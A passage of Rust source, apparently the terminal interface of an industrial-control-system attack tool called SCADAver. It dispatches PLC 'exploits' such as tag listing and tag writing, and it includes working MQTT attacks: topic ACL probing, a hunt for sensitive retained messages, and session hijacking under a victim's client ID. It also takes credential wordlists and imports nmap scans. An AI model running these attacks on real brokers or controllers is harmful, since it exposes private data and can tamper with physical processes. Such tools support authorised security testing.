        "Enumerate Symbols (ADS)"
    } else {
        "List Tags"
    };
    app.exploit_defs = exploits_for(&vendor);
    let Some(idx) = app
        .exploit_defs
        .iter()
        .position(|e| e.label == exploit_label)
    else {
        return;
    };
    app.exploit_sel = idx;
    let Some(ip) = app.selected_device_ip() else {
        return;
    };
    let port = app.action_port(&vendor, idx);
    let pending = PendingExploit {
        vendor,
        idx,
        ip,
        port,
        input: String::new(),
        label: exploit_label.to_string(),
    };
    execute_pending_exploit(app, &pending);
}

fn draw_cache_rescan_popup(frame: &mut Frame, area: Rect, app: &App) {
    let popup = centered_rect(62, 30, area);
    frame.render_widget(Clear, popup);
    let tag_name = app
        .pending_tag_write
        .as_ref()
        .map_or("(unknown)", |(p, _)| p.as_str());
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            " Tags are from a previous scan.",
            Style::default().fg(Color::Yellow),
        )),
        Line::from(Span::styled(
            " Values may be stale — write could target the wrong state.",
            Style::default().fg(Color::DarkGray),
        )),
        Line::from(""),
        Line::from(vec![
            Span::styled(" Tag: ", Style::default().fg(Color::DarkGray)),
            Span::styled(tag_name, Style::default().fg(Color::White)),
        ]),
        Line::from(""),
        Line::from(Span::styled(
            " [Y] Rescan first   [N] Write with cached data   [ESC] Cancel",
            Style::default().fg(Color::Cyan),
        )),
        Line::from(""),
    ];
    let block = Block::default()
        .borders(Borders::ALL)
        .title(" Cached Tag Data ")
        .title_style(
            Style::default()
                .fg(Color::Yellow)
                .add_modifier(Modifier::BOLD),
        )
        .border_style(Style::default().fg(Color::Yellow));
    let para = Paragraph::new(text).block(block).wrap(Wrap { trim: false });
    frame.render_widget(para, popup);
}

fn handle_cache_rescan_prompt(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Char('y' | 'Y') | KeyCode::Enter => {
            app.pending_tag_write = None;
            app.mode = Mode::OutputZoom;
            // Fire "List Tags" for the current device automatically.
            app.open_exploit_menu();
            let list_tags_idx = app.exploit_defs.iter().position(|e| e.label == "List Tags");
            if let Some(idx) = list_tags_idx {
                app.exploit_sel = idx;
                fire_exploit(app, "");
            }
            app.mode = Mode::Normal;
        }
        KeyCode::Char('n' | 'N') => {
            if let Some((path, _)) = app.pending_tag_write.take() {
                let label = format!("Write Tag: {path}");
                app.pending_exploit = Some(PendingExploit {
                    vendor: app.tag_write_vendor.clone(),
                    idx: 3,
                    ip: app.tag_write_ip.clone(),
                    port: app.tag_write_port,
                    input: String::new(),
                    label,
                });
                app.input_buf = format!("{path}=");
                app.tag_write_pending = true;
                app.mode = Mode::ExploitInput;
            } else {
                app.mode = Mode::OutputZoom;
            }
        }
        KeyCode::Esc => {
            app.pending_tag_write = None;
            app.mode = Mode::OutputZoom;
        }
        _ => {}
    }
}

fn fire_exploit(app: &mut App, input: &str) {
    if let (Some(ip), Some(vendor)) = (app.selected_device_ip(), app.selected_vendor()) {
        let Some(exploit_def) = app.exploit_defs.get(app.exploit_sel) else {
            return;
        };
        let label = exploit_def.label;
        let availability = action_availability(app, exploit_def);
        if !availability.enabled {
            let reason = availability.reason.unwrap_or("action unavailable");
            app.output_lines
                .push(format!("[!] {label} unavailable: {reason}"));
            app.output_scroll = 0;
            return;
        }
        let pending = PendingExploit {
            vendor: vendor.clone(),
            idx: app.exploit_sel,
            ip: ip.clone(),
            port: app.action_port(&vendor, app.exploit_sel),
            input: input.to_string(),
            label: label.to_string(),
        };
        if requires_confirmation(exploit_def) {
            app.pending_exploit = Some(pending);
            app.mode = Mode::ExploitConfirm;
            app.input_buf.clear();
        } else {
            execute_pending_exploit(app, &pending);
        }
    }
}

// ─── Entry point ─────────────────────────────────────────────────────────────

fn execute_pending_exploit(app: &mut App, pending: &PendingExploit) {
    let is_monitor = app
        .exploit_defs
        .get(pending.idx)
        .is_some_and(|e| e.is_monitor);

    if app.active_jobs == 0 {
        if app.output_has_tag_content {
            // Preserve the tag list — append exploit output below a separator so the
            // user can still scroll up to see tags.  Next exploit will clear normally.
            app.output_lines.push("\u{2500}".repeat(60));
            app.output_has_tag_content = false;
        } else {
            app.output_lines.clear();
        }
        app.output_scroll = 0;
    }
    app.output_lines
        .push(format!("══ {} @ {} ══", pending.label, pending.ip));
    app.log(format!("[*] Running: {} on {}", pending.label, pending.ip));
    app.active_jobs += 1;

    if is_monitor {
        if let Some(stop) = app.monitor_stop.take() {
            stop.store(true, Ordering::SeqCst);
        }
        let stop = Arc::new(AtomicBool::new(false));
        app.monitor_stop = Some(Arc::clone(&stop));
        let tx = app.scan_tx.clone();
        let ip2 = pending.ip.clone();
        let label2 = pending.label.clone();
        let port = pending.port;
        std::thread::spawn(move || {
            struct DoneGuard {
                tx: mpsc::Sender<ScanEvent>,
                msg: String,
            }
            impl Drop for DoneGuard {
                fn drop(&mut self) {
                    let _ = self.tx.send(ScanEvent::Done(std::mem::take(&mut self.msg)));
                }
            }
            let _guard = DoneGuard {
                tx: tx.clone(),
                msg: format!("{label2} @ {ip2}"),
            };

            let tx2 = tx.clone();
            let out = move |msg: &str| {
                let _ = tx2.send(ScanEvent::Output(msg.to_string()));
            };
            exploit_rockwell_monitor(&ip2, port, &out, &stop);
        });
    } else {
        run_exploit_for(
            &pending.vendor,
            pending.idx,
            &pending.ip,
            pending.port,
            &pending.input,
            &pending.label,
            app.scan_tx.clone(),
        );
    }
}

pub fn run(db: &Database) -> Result<()> {
    let mut app = App::new(db);
    app.log("[*] SCADAver started. Press [?] for help, [S] to scan, [A] to add an IP.");

    let mut terminal = ratatui::init();
    let result = run_loop(&mut terminal, &mut app, db);
    ratatui::restore();
    result
}

fn run_loop<B: Backend>(terminal: &mut Terminal<B>, app: &mut App, db: &Database) -> Result<()> {
    loop {
        app.drain_scan_events(db); // flush queued events before swapping device buffers
        app.sync_device_output();
        app.drain_mqtt_messages();
        terminal.draw(|f| draw(f, app))?;

        if event::poll(Duration::from_millis(50))? {
            if let Event::Key(key) = event::read()? {
                if key.kind == KeyEventKind::Press && handle_key(app, db, key.code, key.modifiers) {
                    break;
                }
            }
        }
    }
    Ok(())
}

// ─── Export ──────────────────────────────────────────────────────────────────

fn export_to_file(app: &App) -> anyhow::Result<String> {
    let epoch = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    let all_devices = Database::open(&Database::default_path())
        .and_then(|d| d.load_devices())
        .unwrap_or_default();

    if matches!(app.export_format, ExportFormat::Csv) {
        let filename = format!("scadaver-{epoch}.csv");
        let mut out = String::from("ip,vendor,last_seen,fields\n");
        for d in &all_devices {
            let fields_json = serde_json::to_string(&d.fields)
                .unwrap_or_else(|_| "{}".to_string())
                .replace('"', "\"\"");
            let _ = writeln!(
                out,
                "{},{},{},\"{}\"",
                d.ip, d.vendor, d.last_seen, fields_json
            );
        }
        std::fs::write(&filename, out)?;
        return Ok(filename);
    }

    let filename = format!("scadaver-{epoch}.json");

    let devices: Vec<serde_json::Value> = all_devices
        .iter()
        .map(|d| {
            serde_json::json!({
                "ip": d.ip,
                "vendor": d.vendor,
                "last_seen": d.last_seen,
                "fields": d.fields,
            })
        })
        .collect();

    let mqtt_section = if app.mqtt_session.is_some() || !app.mqtt_broker.is_empty() {
        let topics: Vec<serde_json::Value> = app
            .mqtt_topics
            .iter()
            .map(|(t, c, last)| {
                serde_json::json!({
                    "topic": t,
                    "count": c,
                    "last_payload": last,
                    "retained": app.mqtt_retained.contains(t.as_str()),
                })
            })
            .collect();
        Some(serde_json::json!({
            "broker": app.mqtt_broker,
            "topics": topics,
            "attack_results": app.mqtt_attack_lines,
            "attack_label": app.mqtt_attack_label,
        }))
    } else {
        None
    };

    let mut root = serde_json::json!({
        "tool": "scadaver",
        "version": env!("CARGO_PKG_VERSION"),
        "exported_at": epoch,
        "source": "tui",
        "devices": devices,
        "output": app.output_lines,
    });

    if let Some(mqtt) = mqtt_section {
        root["mqtt"] = mqtt;
    }

    let text = serde_json::to_string_pretty(&root)?;
    std::fs::write(&filename, text)?;
    Ok(filename)
}

// ─── MQTT monitor ────────────────────────────────────────────────────────────

fn draw_mqtt_panel(frame: &mut Frame, area: Rect, app: &mut App) {
    let rows = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(1), Constraint::Min(0)])
        .split(area);

    let filter_note = if app.mqtt_filter.is_empty() {
        String::new()
    } else {
        format!("  filter: {}", app.mqtt_filter)
    };
    let tls_badge = if app.mqtt_conn.tls || app.mqtt_broker.contains(":8883") {
        "  TLS"
    } else {
        ""
    };
    let ver_badge = match app.mqtt_conn.version {
        MqttVersion::V311 => "",
        MqttVersion::V5 => "  v5.0",
    };
    let header_text = format!(
        " MQTT  {}{}{}  \u{2502}  {} topics  \u{2502}  {} msgs{}  \u{2502}  [ESC/M] disconnect",
        app.mqtt_broker,
        tls_badge,
        ver_badge,
        app.mqtt_topics.len(),
        app.mqtt_total_msgs,
        filter_note,
    );
    frame.render_widget(
        Paragraph::new(header_text).style(Style::new().fg(Color::Black).bg(Color::Cyan)),
        rows[0],
    );

    let cols = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(40), Constraint::Percentage(60)])
        .split(rows[1]);

    let filter_lower = app.mqtt_filter.to_lowercase();
    let visible: Vec<ListItem> = app
        .mqtt_topics
        .iter()
        .filter(|(t, _, _)| filter_lower.is_empty() || t.to_lowercase().contains(&filter_lower))
        .map(|(topic, count, _)| {
            let r = if app.mqtt_retained.contains(topic) {
                "R"
            } else {
                " "
            };
            ListItem::new(format!(" [{r}] {topic:<46} {count:>4}"))
        })
        .collect();

    let topic_list = List::new(visible)
        .block(Block::default().borders(Borders::ALL).title(" Topics "))
        .highlight_style(
            Style::new()
                .bg(Color::DarkGray)
                .add_modifier(Modifier::BOLD),
        )
        .highlight_symbol("\u{25b6} ");
    frame.render_stateful_widget(topic_list, cols[0], &mut app.mqtt_topic_list_state);

    let selected_idx = app.mqtt_topic_list_state.selected().unwrap_or(0);
    let filtered: Vec<&(String, usize, String)> = app
        .mqtt_topics
        .iter()
        .filter(|(t, _, _)| filter_lower.is_empty() || t.to_lowercase().contains(&filter_lower))
        .collect();

    if app.mqtt_attack_lines.is_empty() {
        let detail_text = if let Some((topic, count, last_display)) = filtered.get(selected_idx) {
            let retained_str = if app.mqtt_retained.contains(topic.as_str()) {
                "yes"
            } else {
                "no"
            };
            format!(
                    "\n Topic:    {topic}\n\n Last:     {last_display}\n\n Messages: {count}\n Retained: {retained_str}"
                )
        } else if app.mqtt_session.is_some() {
            "\n Waiting for messages…\n\n Subscribed to # and $SYS/#\n\n [a] ACL  [r] Retain  [s] Session"
                    .to_string()
        } else {
            "\n (not connected)".to_string()
        };

        frame.render_widget(
            Paragraph::new(detail_text)
                .block(Block::default().borders(Borders::ALL).title(" Detail ")),
            cols[1],
        );
    } else {
        let running_tag = if app.mqtt_attack_running {
            " [running\u{2026}]"
        } else {
            ""
        };
        let title = format!(
            " {}{running_tag} — press c to clear ",
            app.mqtt_attack_label
        );
        let content = app.mqtt_attack_lines.join("\n");
        let scroll_row = u16::try_from(app.mqtt_attack_scroll).unwrap_or(u16::MAX);
        frame.render_widget(
            Paragraph::new(content)
                .block(Block::default().borders(Borders::ALL).title(title))
                .scroll((scroll_row, 0)),
            cols[1],
        );
    }
}

fn handle_mqtt_monitor(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc | KeyCode::Char('m' | 'M') => {
            app.mqtt_session = None;
            app.mode = Mode::Normal;
            app.log("[*] MQTT monitor disconnected.".to_string());
        }
        KeyCode::Char('j') | KeyCode::Down => {
            let max = app.mqtt_topics.len().saturating_sub(1);
            let next = app
                .mqtt_topic_list_state
                .selected()
                .map_or(0, |i| (i + 1).min(max));
            app.mqtt_topic_list_state.select(Some(next));
        }
        KeyCode::Char('k') | KeyCode::Up => {
            let prev = app
                .mqtt_topic_list_state
                .selected()
                .map_or(0, |i| i.saturating_sub(1));
            app.mqtt_topic_list_state.select(Some(prev));
        }
        KeyCode::Char('/') => {
            app.mqtt_filter.clear();
        }
        KeyCode::Char('a') => {
            if app.mqtt_attack_running {
                app.mqtt_attack_lines
                    .push("[*] Attack already running\u{2026}".into());
            } else {
                run_tui_acl(app);
            }
        }
        KeyCode::Char('r') => {
            if app.mqtt_attack_running {
                app.mqtt_attack_lines
                    .push("[*] Attack already running\u{2026}".into());
            } else {
                run_tui_retain(app);
            }
        }
        KeyCode::Char('s') => {
            app.input_buf.clear();
            app.mode = Mode::MqttClientIdInput;
        }
        KeyCode::Char('c') => {
            app.mqtt_attack_lines.clear();
            app.mqtt_attack_scroll = 0;
            app.mqtt_attack_label.clear();
        }
        KeyCode::Char('J') => {
            if !app.mqtt_attack_lines.is_empty() {
                let max = app.mqtt_attack_lines.len().saturating_sub(1);
                app.mqtt_attack_scroll = (app.mqtt_attack_scroll + 1).min(max);
            }
        }
        KeyCode::Char('K') => {
            app.mqtt_attack_scroll = app.mqtt_attack_scroll.saturating_sub(1);
        }
        _ => {}
    }
}

fn handle_mqtt_client_id_input(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            app.input_buf.clear();
            app.mode = Mode::MqttMonitor;
        }
        KeyCode::Enter => {
            let clientid = app.input_buf.trim().to_string();
            app.input_buf.clear();
            app.mode = Mode::MqttMonitor;
            if !clientid.is_empty() {
                run_tui_session_hijack(app, &clientid);
            }
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
        }
        KeyCode::Char(c) => {
            app.input_buf.push(c);
        }
        _ => {}
    }
}

fn draw_mqtt_clientid_input(frame: &mut Frame, area: Rect, app: &App) {
    let popup = centered_rect(54, 22, area);
    frame.render_widget(Clear, popup);
    frame.render_widget(
        Paragraph::new(format!(
            "\n  ClientID to hijack:\n\n  > {}\u{2588}",
            app.input_buf
        ))
        .block(
            Block::default()
                .borders(Borders::ALL)
                .title(" Session Hijack — [ENTER] run  [ESC] cancel "),
        ),
        popup,
    );
}

fn handle_mqtt_cred_input(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            app.input_buf.clear();
            app.mode = Mode::Normal;
        }
        KeyCode::Enter => {
            let raw = app.input_buf.trim().to_string();
            app.input_buf.clear();
            app.mode = Mode::Normal;
            if raw.is_empty() {
                app.mqtt_username.clear();
                app.mqtt_password.clear();
                app.log("[*] MQTT credentials cleared".to_string());
            } else if let Some((u, p)) = raw.split_once(':') {
                app.mqtt_username = u.to_string();
                app.mqtt_password = p.to_string();
                app.log(format!("[*] MQTT credentials set: user={u}"));
            } else {
                app.mqtt_username.clone_from(&raw);
                app.mqtt_password.clear();
                app.log(format!("[*] MQTT username set (no password): user={raw}"));
            }
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
        }
        KeyCode::Char(c) => {
            app.input_buf.push(c);
        }
        _ => {}
    }
}

fn draw_mqtt_cred_input(frame: &mut Frame, area: Rect, app: &App) {
    let cred_hint = if app.mqtt_username.is_empty() {
        "(no credentials set)".to_string()
    } else {
        format!("current user: {}", app.mqtt_username)
    };
    let popup = centered_rect(58, 28, area);
    frame.render_widget(Clear, popup);
    frame.render_widget(
        Paragraph::new(format!(
            "\n  Format:  username:password\n  Empty = clear credentials\n\n  {cred_hint}\n\n  > {}\u{2588}",
            app.input_buf
        ))
        .block(
            Block::default()
                .borders(Borders::ALL)
                .title(" MQTT Credentials — [ENTER] save  [ESC] cancel "),
        ),
        popup,
    );
}

fn handle_import_input(app: &mut App, db: &Database, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            app.input_buf.clear();
            app.mode = Mode::Normal;
        }
        KeyCode::Enter => {
            let path = app.input_buf.trim().to_string();
            app.input_buf.clear();
            app.mode = Mode::Normal;
            if path.is_empty() {
                app.log("[!] No path entered".to_string());
                return;
            }
            match crate::import::parse_nmap_xml(&path) {
                Err(e) => {
                    app.output_lines.push(format!("[!] Import failed: {e:#}"));
                }
                Ok(hosts) => {
                    let total = hosts.len();
                    let mut imported = 0usize;
                    for host in &hosts {
                        let mut obj = serde_json::Map::new();
                        obj.insert("open_ports".to_string(), serde_json::json!(host.open_ports));
                        if !host.hostnames.is_empty() {
                            obj.insert("hostnames".to_string(), serde_json::json!(host.hostnames));
                        }
                        let fields = serde_json::Value::Object(obj);
                        if db.upsert_device(&host.ip, "nmap", &fields).is_ok() {
                            imported += 1;
                        }
                    }
                    app.output_lines
                        .push(format!("[+] Imported {imported}/{total} hosts from {path}"));
                    app.reload(db);
                }
            }
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
        }
        KeyCode::Char(c) => app.input_buf.push(c),
        _ => {}
    }
}

fn draw_import_input(frame: &mut Frame, area: Rect, app: &App) {
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            " Path to nmap XML output file:",
            Style::default().fg(Color::DarkGray),
        )),
        Line::from(""),
        Line::from(Span::styled(
            format!("  > {}\u{2588}", app.input_buf),
            Style::default()
                .fg(Color::Cyan)
                .add_modifier(Modifier::BOLD),
        )),
        Line::from(""),
        Line::from(Span::styled(
            " Generate with: nmap -oX scan.xml <target>",
            Style::default().fg(Color::DarkGray),
        )),
        Line::from(Span::styled(
            " Imports all up hosts with at least one open port.",
            Style::default().fg(Color::DarkGray),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(
                Block::default()
                    .title(" Import nmap XML ")
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Cyan)),
            )
            .wrap(Wrap { trim: false }),
        area,
    );
}

fn handle_wordlist_input(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            app.input_buf.clear();
            app.mode = Mode::Normal;
        }
        KeyCode::Enter => {
            let raw = app.input_buf.trim().to_string();
            app.input_buf.clear();
            app.mode = Mode::Normal;
            if raw.is_empty() {
                app.wordlist_path = None;
                app.log("[*] Wordlist cleared — using built-in defaults".to_string());
            } else {
                app.wordlist_path = Some(raw.clone());
                app.log(format!("[*] Wordlist set: {raw}"));
            }
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
        }
        KeyCode::Char(c) => app.input_buf.push(c),
        _ => {}
    }
}

fn draw_wordlist_input(frame: &mut Frame, area: Rect, app: &App) {
    let current = app
        .wordlist_path
        .as_deref()
        .unwrap_or("(none — using built-in defaults)");
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            " Path to credential wordlist (user:pass, one per line):",
            Style::default().fg(Color::DarkGray),
        )),
        Line::from(""),
        Line::from(Span::styled(
            format!("  > {}\u{2588}", app.input_buf),
            Style::default()
                .fg(Color::Cyan)
                .add_modifier(Modifier::BOLD),
        )),
        Line::from(""),
        Line::from(Span::styled(
            format!("  Current: {current}"),
            Style::default().fg(Color::DarkGray),
        )),
        Line::from(Span::styled(
            " Leave empty and press ENTER to reset to built-in defaults.",
            Style::default().fg(Color::DarkGray),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(
                Block::default()
                    .title(" Custom Wordlist ")
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Cyan)),
            )
            .wrap(Wrap { trim: false }),
        area,
    );
}

fn run_tui_acl(app: &mut App) {
    let base = {
        let filter_lower = app.mqtt_filter.to_lowercase();
        let idx = app.mqtt_topic_list_state.selected().unwrap_or(0);
        let filtered: Vec<&String> = app
            .mqtt_topics
            .iter()
            .filter(|(t, _, _)| filter_lower.is_empty() || t.to_lowercase().contains(&filter_lower))
            .map(|(t, _, _)| t)
            .collect();
        filtered.get(idx).map(|t| (*t).clone())
    };
    let Some(base) = base else { return };
    let Some(arc) = app.mqtt_session.as_ref() else {
        return;
    };
    let arc = Arc::clone(arc);
    let tx = app.scan_tx.clone();

    app.mqtt_attack_running = true;
    app.mqtt_attack_lines.clear();
    app.mqtt_attack_lines.push(format!(" ACL probe: {base}"));
    app.mqtt_attack_lines.push("─".repeat(60));
    app.mqtt_attack_lines
        .push(format!("{:<26} access", "variant"));
    app.mqtt_attack_lines.push("─".repeat(60));
    app.mqtt_attack_scroll = 0;
    app.mqtt_attack_label = "ACL Probe".into();

    std::thread::spawn(move || {
        let mut session = arc
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        session.flush_subacks();
        let mut tested = std::collections::HashSet::new();
        let variants = acl_variants(&base);
        for variant in variants {
            if tested.len() >= 20 {
                let _ = tx.send(ScanEvent::MqttLine(
                    "[limit] max 20 variants reached.".into(),
                ));
                break;
            }
            if !tested.insert(variant.clone()) {
                continue;
            }
            let sub_sent = session.subscribe(&variant, 0).is_ok();
            let sl = if sub_sent {
                let code = session.poll_suback(Duration::from_millis(500));
                let granted = code.is_some_and(|c| c < 0x80);
                let n = if granted {
                    let dl = std::time::Instant::now() + Duration::from_millis(500);
                    let mut count = 0usize;
                    while std::time::Instant::now() < dl {
                        count += session.drain_messages().len();
                        std::thread::sleep(Duration::from_millis(50));
                    }
                    count
                } else {
                    0
                };
                let _ = session.unsubscribe(&variant);
                if granted {
                    format!("SUB:YES({n})")
                } else {
                    "SUB:DENY  ".into()
                }
            } else {
                "SUB:ERR   ".into()
            };
            let pub_ok = session
                .publish(&variant, b"scadaver/acl-probe", 0, false)
                .is_ok();
            let pl = if pub_ok { "PUB:YES" } else { "PUB:NO " };
            let _ = tx.send(ScanEvent::MqttLine(format!("[{sl:<12} {pl}]  {variant}")));
        }
        let _ = tx.send(ScanEvent::MqttLine("─".repeat(60)));
        let _ = tx.send(ScanEvent::MqttLine(format!(
            " {} variant(s) tested.",
            tested.len()
        )));
        let _ = tx.send(ScanEvent::MqttDone("ACL Probe".into()));
    });
}

fn run_tui_retain(app: &mut App) {
    let Some(arc) = app.mqtt_session.as_ref() else {
        return;
    };
    let arc = Arc::clone(arc);
    let tx = app.scan_tx.clone();

    app.mqtt_attack_running = true;
    app.mqtt_attack_lines.clear();
    app.mqtt_attack_scroll = 0;
    app.mqtt_attack_label = "Retain Hunt".into();

    std::thread::spawn(move || {
        let mut session = arc
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        if session.subscribe("#", 0).is_err() {
            let _ = tx.send(ScanEvent::MqttLine(" Retain Hunt".into()));
            let _ = tx.send(ScanEvent::MqttLine("─".repeat(60)));
            let _ = tx.send(ScanEvent::MqttLine(
                "[-] Subscribe to # failed \u{2014} broker may require authentication".into(),
            ));
            let _ = tx.send(ScanEvent::MqttDone("Retain Hunt".into()));
            return;
        }
        let _ = tx.send(ScanEvent::MqttLine(" Retain Hunt (5s)".into()));
        let _ = tx.send(ScanEvent::MqttLine("─".repeat(60)));

        let deadline = std::time::Instant::now() + Duration::from_secs(5);
        let mut retained_count = 0usize;
        let mut sensitive_count = 0usize;

        while std::time::Instant::now() < deadline {
            for msg in session.drain_messages() {
                if !msg.retain {
                    continue;
                }
                retained_count += 1;
                let (fmt, display) = classify_payload(&msg.topic, &msg.payload);
                let sensitive = is_sensitive(&display, &msg.topic);
                if sensitive {
                    sensitive_count += 1;
                }
                let flag = if sensitive {
                    "[SENSITIVE]"
                } else {
                    "[         ]"
                };
                let _ = tx.send(ScanEvent::MqttLine(format!(
                    "{flag}  {} : {}  [{fmt}]",
                    msg.topic, display
                )));
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        let _ = session.unsubscribe("#");
        let _ = tx.send(ScanEvent::MqttLine("─".repeat(60)));
        let _ = tx.send(ScanEvent::MqttLine(format!(
            " {retained_count} retained, {sensitive_count} sensitive."
        )));
        let _ = tx.send(ScanEvent::MqttDone("Retain Hunt".into()));
    });
}

fn run_tui_session_hijack(app: &mut App, clientid: &str) {
    if app.mqtt_attack_running {
        app.mqtt_attack_lines
            .push("[*] Attack already running\u{2026}".into());
        return;
    }
    let (host, port) = match app.mqtt_broker.rsplit_once(':') {
        Some((h, p)) => match p.parse::<u16>() {
            Ok(p) => (h.to_string(), p),
            Err(_) => return,
        },
        None => return,
    };
    let clientid = clientid.to_string();
    let username = if app.mqtt_username.is_empty() {
        None
    } else {
        Some(app.mqtt_username.clone())
    };
    let password = if app.mqtt_password.is_empty() {
        None
    } else {
        Some(app.mqtt_password.clone())
    };
    let tx = app.scan_tx.clone();

    app.mqtt_attack_running = true;
    app.mqtt_attack_lines.clear();
    app.mqtt_attack_scroll = 0;
    app.mqtt_attack_label = "Session Hijack".into();

    std::thread::spawn(move || {
        let sep = "─".repeat(60);
        let _ = tx.send(ScanEvent::MqttLine(format!(
            " Session Hijack: clientid={clientid}"
        )));
        let _ = tx.send(ScanEvent::MqttLine(sep.clone()));

        let opts = ConnectOptions {
            host,
            port,
            client_id: clientid,
            keepalive: 30,
            clean_session: false,
            username,
            password,
            will: None,
            tls: false,
            tls_verify: false,
            protocol_version: MqttVersion::default(),
        };

        let mut hijack = match MqttSession::connect(&opts) {
            Ok(s) => {
                let state = if s.session_present {
                    "YES (queued messages incoming)"
                } else {
                    "NO (fresh session / victim wiped)"
                };
                let _ = tx.send(ScanEvent::MqttLine(format!(
                    "[+] Connected. Session present: {state}"
                )));
                s
            }
            Err(e) => {
                let _ = tx.send(ScanEvent::MqttLine(format!("[-] Connect failed: {e:#}")));
                let _ = tx.send(ScanEvent::MqttDone("Session Hijack".into()));
                return;
            }
        };

        let _ = hijack.subscribe("#", 1);
        let _ = tx.send(ScanEvent::MqttLine("[*] Draining for 5s (QoS 1)...".into()));

        let deadline = std::time::Instant::now() + Duration::from_secs(5);
        let mut total = 0usize;
        let mut unique: std::collections::HashSet<String> = std::collections::HashSet::new();

        while std::time::Instant::now() < deadline {
            for msg in hijack.drain_messages() {
                total += 1;
                unique.insert(msg.topic.clone());
                let (fmt, display) = classify_payload(&msg.topic, &msg.payload);
                let tag = if msg.retain { "R" } else { "Q" };
                let _ = tx.send(ScanEvent::MqttLine(format!(
                    "[{tag}] {} : {}  [{fmt}]",
                    msg.topic, display
                )));
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        let _ = hijack.disconnect();
        let _ = tx.send(ScanEvent::MqttLine(sep));
        let _ = tx.send(ScanEvent::MqttLine(format!(
            " {total} messages, {} unique topics.",
            unique.len()
        )));
        let _ = tx.send(ScanEvent::MqttDone("Session Hijack".into()));
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ops::{
        modbus_map_chunks, parse_modbus_map_input, parse_slmp_map_input, slmp_map_chunks,
        ModbusMapRange, ModbusTable, SlmpDeviceKind, SlmpMapRange, MODBUS_ADDRESS_SPACE,
        SLMP_ADDRESS_SPACE,
    };

    #[test]
    fn parse_target_scan_accepts_ip_only() {
        let target = parse_target_scan("192.168.1.10").unwrap();
        assert_eq!(target.ip, "192.168.1.10");
        assert_eq!(target.port, None);
        assert_eq!(target.transport, None);
        assert_eq!(target.vendor, None);
    }

    #[test]
    fn parse_target_scan_accepts_port_and_transport() {
        let target = parse_target_scan("192.168.1.10:1502 tcp").unwrap();
        assert_eq!(target.ip, "192.168.1.10");
        assert_eq!(target.port, Some(1502));
        assert_eq!(target.transport, Some(TargetTransport::Tcp));
        assert_eq!(target.vendor, None);
    }

    #[test]
    fn parse_target_scan_accepts_port_only() {
        let target = parse_target_scan("192.168.1.10:1502").unwrap();
        assert_eq!(target.ip, "192.168.1.10");
        assert_eq!(target.port, Some(1502));
        assert_eq!(target.transport, None);
        assert_eq!(target.vendor, None);
    }

    #[test]
    fn parse_target_scan_accepts_transport_only() {
        let udp = parse_target_scan("192.168.1.10 udp").unwrap();
        assert_eq!(udp.ip, "192.168.1.10");
        assert_eq!(udp.port, None);
        assert_eq!(udp.transport, Some(TargetTransport::Udp));

        let both = parse_target_scan("192.168.1.10 both").unwrap();
        assert_eq!(both.ip, "192.168.1.10");
        assert_eq!(both.port, None);
        assert_eq!(both.transport, Some(TargetTransport::Both));
    }

    #[test]
    fn parse_target_scan_accepts_vendor_hints() {
        let mitsubishi = parse_target_scan("192.168.1.10:5007 mitsubishi").unwrap();
        assert_eq!(mitsubishi.ip, "192.168.1.10");
        assert_eq!(mitsubishi.port, Some(5007));
        assert_eq!(mitsubishi.transport, None);
        assert_eq!(mitsubishi.vendor.as_deref(), Some("mitsubishi"));

        let beckhoff = parse_target_scan("192.168.1.10:48898 beckhoff tcp").unwrap();
        assert_eq!(beckhoff.ip, "192.168.1.10");
        assert_eq!(beckhoff.port, Some(48898));
        assert_eq!(beckhoff.transport, Some(TargetTransport::Tcp));
        assert_eq!(beckhoff.vendor.as_deref(), Some("beckhoff"));
    }

    #[test]
    fn parse_target_scan_rejects_bad_transport() {
        assert!(parse_target_scan("192.168.1.10 serial").is_none());
        assert!(parse_target_scan("192.168.1.10 tcp udp").is_none());
        assert!(parse_target_scan("192.168.1.10 schneider mitsubishi").is_none());
    }

    #[test]
    fn parse_target_scan_rejects_invalid_ports() {
        assert!(parse_target_scan("192.168.1.10:0").is_none());
        assert!(parse_target_scan("192.168.1.10:65536").is_none());
        assert!(parse_target_scan("192.168.1.10:notaport").is_none());
    }

    #[test]
    fn parse_modbus_map_input_defaults_to_quick() {
        let ranges = parse_modbus_map_input("").unwrap();
        assert_eq!(
            ranges,
            vec![
                ModbusMapRange::new(ModbusTable::Holding, 0, 32),
                ModbusMapRange::new(ModbusTable::Input, 0, 32),
                ModbusMapRange::new(ModbusTable::Coil, 0, 64),
                ModbusMapRange::new(ModbusTable::Discrete, 0, 64),
            ]
        );
        assert_eq!(parse_modbus_map_input("quick").unwrap(), ranges);
    }

    #[test]
    fn parse_modbus_map_input_common_and_all() {
        let common = parse_modbus_map_input("common").unwrap();
        assert_eq!(
            common[0],
            ModbusMapRange::new(ModbusTable::Holding, 0, 1000)
        );
        assert_eq!(
            common[3],
            ModbusMapRange::new(ModbusTable::Discrete, 0, 2000)
        );

        let all = parse_modbus_map_input("all").unwrap();
        assert_eq!(
            all,
            vec![
                ModbusMapRange::new(ModbusTable::Holding, 0, MODBUS_ADDRESS_SPACE),
